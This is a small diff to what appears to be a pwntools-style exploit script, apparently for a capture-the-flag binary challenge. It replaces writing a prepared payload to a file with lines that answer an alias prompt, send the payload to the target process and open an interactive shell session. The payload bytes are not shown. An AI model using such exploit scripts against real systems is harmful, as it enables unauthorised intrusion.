@@ -24,10 +24,8 @@ payload = b"".join(
     ]
 )
 
-#p.recvuntil('Enter your alias: \n')
-#p.send(b'ic3')
-f = open("demofile2.txt", "bw")
-f.write(payload)
-f.close()
+p.recvuntil('Enter your alias: \n')
+p.send(b'ic3')
+
 p.send(payload)
 p.interactive()
